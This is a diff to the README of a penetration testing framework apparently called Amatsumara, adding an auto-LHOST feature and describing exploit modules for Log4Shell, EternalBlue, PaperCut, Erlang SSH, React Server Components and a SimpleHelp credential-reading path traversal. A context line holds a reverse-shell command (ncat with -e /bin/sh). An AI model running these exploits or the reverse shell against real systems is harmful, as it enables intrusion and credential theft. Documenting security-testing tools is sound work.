@@ -16,24 +16,33 @@
 
 ## Overview
 
-Amatsumara is a penetration testing framework built for performance and safety. Modules are `.so` shared libraries loaded via C FFI — add new capabilities by dropping a `.so` into the modules directory.
+Amatsumara is a penetration testing framework built for performance and safety. Modules are `.so` shared libraries loaded via C FFI -- add new capabilities by dropping a `.so` into the modules directory.
 
 | | Count |
 |---|---|
-| Exploit Modules | 3 |
-| Auxiliary Scanners | 16 |
+| Exploit Modules | 6 |
+| Auxiliary Modules | 17 |
 | Post-Exploitation Modules | 2 |
 | Payload Generators | 9 |
 
 ### Features
 
-- **Dynamic Module Loading** — `.so` modules loaded at runtime, no framework recompile needed
-- **Tab Completion** — commands, module names, options, subcommands
-- **Session Management** — open, background, interact, kill sessions across targets
-- **Background Jobs** — run listeners in the background with `-j`
-- **Global Options** — `setg LHOST` once, applies everywhere
-- **Numbered Search** — `search` results are numbered for quick `use 0` selection
-- **Async Runtime** — built on Tokio
+- **Dynamic Module Loading** -- `.so` modules loaded at runtime, no framework recompile needed
+- **AutoLHOST** -- automatic VPN interface detection (tun0/tap0)
+- **Tab Completion** -- commands, module names, options, subcommands
+- **Session Management** -- open, background, interact, kill sessions across targets
+- **Background Jobs** -- run listeners in the background with `-j`
+- **Global Options** -- `setg LHOST` once, applies everywhere
+- **Numbered Search** -- `search` results are numbered for quick `use 0` selection
+- **Async Runtime** -- built on Tokio
+
+---
+
+## AutoLHOST
+
+Amatsumara automatically detects your active VPN interface (tun0/tap0) and
+populates LHOST when a module is loaded. No more running `ip a` before every
+exploit. To disable: `set autolhost false`
 
 ---
 
@@ -69,6 +78,7 @@ cargo build --release
 | `unset <OPT>` | Clear a module option. |
 | `setg <OPT> <val>` | Set a global option (persists across modules). |
 | `unsetg <OPT>` | Clear a global option. |
+| `set autolhost <true\|false>` | Toggle automatic LHOST detection. |
 | `options` | Show current module options. |
 
 > Module options (`set`) override globals (`setg`), which override defaults.
@@ -116,8 +126,10 @@ amatsumara > search log4j
   0    Apache Log4j RCE         Log4Shell JNDI injection (CVE-2021-44228)
 
 amatsumara > use 0
-amatsumara Apache Log4j RCE (exploit) > forge RHOST 192.168.1.100
-RHOST => 192.168.1.100
+[*] AutoLHOST: LHOST set to 10.10.14.5 (tun0)
+
+amatsumara Apache Log4j RCE (exploit) > forge RHOSTS 192.168.1.100
+RHOSTS => 192.168.1.100
 
 amatsumara Apache Log4j RCE (exploit) > strike
 [*] Launching module: Apache Log4j RCE
@@ -164,17 +176,26 @@ ncat 10.0.0.5 9001 -e /bin/sh
 
 ## Modules
 
-### Exploits (3)
+### Exploits (6)
 
 | Module | Description |
 |---|---|
-| `ms17_010` | EternalBlue — SMBv1 kernel RCE (CVE-2017-0144) |
-| `apache_log4j_rce` | Log4Shell — JNDI injection RCE (CVE-2021-44228) |
-| `multi_handler` | Generic listener for reverse shell payloads |
+| Apache Log4j RCE (Log4Shell) | Exploits CVE-2021-44228 via JNDI injection in the Log4j logging library. Spins up an internal LDAP and HTTP server to deliver a Java payload and catch a reverse shell. Affects Log4j 2.0-beta9 through 2.14.1. |
+| Erlang/OTP SSH Pre-Auth RCE (CVE-2025-32433) | Pre-authentication RCE in Erlang's native SSH server. Exploits a missing authentication state check to send SSH_MSG_CHANNEL_REQUEST before auth completes, executing arbitrary Erlang code via os:cmd(). CVSS 10.0. |
+| MS17-010 EternalBlue SMB RCE | Exploits the NSA's EternalBlue vulnerability in Windows SMBv1. Sends crafted SMB1 transactions to trigger a buffer overflow and gain SYSTEM-level code execution. Dual-path implementation for Windows 7 and Windows 8+. |
+| Multi Handler | Generic reverse payload listener. Binds a port and waits for incoming connections from any reverse shell payload, registering them as interactive sessions. |
+| PaperCut MF/NG Auth Bypass RCE (CVE-2023-27350) | Unauthenticated RCE in PaperCut print management software via the SetupCompleted authentication bypass chained with print script injection. Executes arbitrary commands as NT AUTHORITY\SYSTEM on Windows. CVSS 9.8. |
+| React Server Components RCE (React2Shell / CVE-2025-55182) | Pre-auth RCE in React Server Components. Exploits insecure deserialization in the RSC Flight protocol to pollute Promise.prototype and execute arbitrary JavaScript server-side via Node.js. CVSS 10.0. |
+
+### Auxiliary Modules (1)
+
+| Module | Description |
+|---|---|
+| SimpleHelp Path Traversal File Read (CVE-2024-57727) | Unauthenticated arbitrary file read in SimpleHelp remote support software <= 5.5.7. Exploits a path traversal flaw in the /toolbox-resource/ endpoint via raw TCP to preserve ../ sequences. Iterates 16 valid subdirectory names to cover both Windows and Linux targets without OS detection. Automatically parses and highlights credentials from serverconfig.xml. CVSS 7.5. |
 
 ### Auxiliary Scanners (16)
 
-FTP, HTTP directory, HTTP auth brute, IMAP, LDAP, Memcached, MySQL, POP3, port scan, Redis, SMB version, SMTP, SNMP, SSH, Telnet, VNC.
+FTP, HTTP directory, HTTP auth brute, IMAP, LDAP, Memcached, MySQL, POP3, port scan, Redis, SMB version, SMTP, SSH, Telnet, VNC, Elasticsearch.
 
 ### Post-Exploitation (2)
 
@@ -203,17 +224,18 @@ FTP, HTTP directory, HTTP auth brute, IMAP, LDAP, Memcached, MySQL, POP3, port s
 
 ```
 Amatsumara-Framework/
-├── amatsumara-api/        # C FFI types (ModuleVTable, ModuleInfo, etc.)
-├── amatsumara-core/       # Module loader, session manager, discovery
-├── amatsumara-console/    # Interactive REPL, tab completion
-├── kanayago/              # Payload generation engine
-├── modules/
-│   ├── exploits/          # Exploit modules (.so + source)
-│   ├── auxiliary/scanner/ # Scanner modules
-│   ├── post/              # Post-exploitation modules
-│   └── payloads/singles/  # Payload generators
-├── pattern-create/        # Buffer overflow pattern generator
-└── pattern-offset/        # Pattern offset finder
++-- amatsumara-api/        # C FFI types (ModuleVTable, ModuleInfo, etc.)
++-- amatsumara-core/       # Module loader, session manager, discovery
++-- amatsumara-console/    # Interactive REPL, tab completion
++-- kanayago/              # Payload generation engine
++-- modules/
+|   +-- exploits/          # Exploit modules (.so + source)
+|   +-- auxiliary/scanner/ # Scanner modules
+|   +-- auxiliary/         # Standalone auxiliary modules
+|   +-- post/              # Post-exploitation modules
+|   +-- payloads/singles/  # Payload generators
++-- pattern-create/        # Buffer overflow pattern generator
++-- pattern-offset/        # Pattern offset finder
 ```
 
 ### Module Loading
@@ -221,11 +243,11 @@ Amatsumara-Framework/
 1. Framework scans `modules/` recursively for `.so` files at startup
 2. Loads each library, calls `amatsumara_module_init()` to get the VTable
 3. Reads metadata via C FFI, indexes by name for search/selection
-4. Drop a new `.so` into modules/ and restart — it's discovered automatically
+4. Drop a new `.so` into modules/ and restart -- it's discovered automatically
 
 ### Sessions
 
-Exploit modules open TCP connections and write session metadata to `/tmp/amatsumara_sessions/`. The console takes ownership of the stream. Sessions persist independently — background, interact later, or kill.
+Exploit modules open TCP connections and write session metadata to `/tmp/amatsumara_sessions/`. The console takes ownership of the stream. Sessions persist independently -- background, interact later, or kill.
 
 ---
 
@@ -253,7 +275,7 @@ serde = { version = "1.0", features = ["derive"] }
 serde_json = "1.0"
 ```
 
-**src/lib.rs** — see any existing module for the pattern. Key points:
+**src/lib.rs** -- see any existing module for the pattern. Key points:
 
 - Use `amatsumara_api::CString` (repr(C)), not `std::ffi::CString`
 - Static metadata strings with `CString` wrappers pointing to `.as_ptr()`
@@ -284,19 +306,7 @@ rm -rf target/
 
 ## Changelog
 
-**v2.0.0** — Removed non-functioning exploit modules. Quality over quantity. Starting fresh with 3 confirmed working exploits.
-
-**v1.4.1** — Audit and bug fixes across 10 modules (port defaults, protocol formatting, nonce extraction, payload targeting).
-
-**v1.3.0** — Full MS17-010 EternalBlue implementation with kernel shellcode and automatic session registration.
-
-**v1.2.0** — 8 new exploit modules.
-
-**v1.1.0** — 8 new HTTP-based exploit modules.
-
-**v1.0.1** — HTTPS transport fix across 22 modules.
-
-**v1.0.0** — Initial release. Dynamic module loading, interactive console, session management, background jobs, 9 payload generators, pattern utilities.
+See [CHANGELOG.md](CHANGELOG.md) for full release history.
 
 ### Future
 
@@ -311,11 +321,11 @@ rm -rf target/
 
 Areas of interest:
 
-1. **Exploit Modules** — new vulnerability implementations
-2. **Protocol Libraries** — SSH, SMB, RDP implementations
-3. **Auxiliary Modules** — scanners, brute forcers, enumerators
-4. **Payloads** — new types, staged payloads, encoders
-5. **Testing** — validation against vulnerable targets
+1. **Exploit Modules** -- new vulnerability implementations
+2. **Protocol Libraries** -- SSH, SMB, RDP implementations
+3. **Auxiliary Modules** -- scanners, brute forcers, enumerators
+4. **Payloads** -- new types, staged payloads, encoders
+5. **Testing** -- validation against vulnerable targets
 
 ## License
 
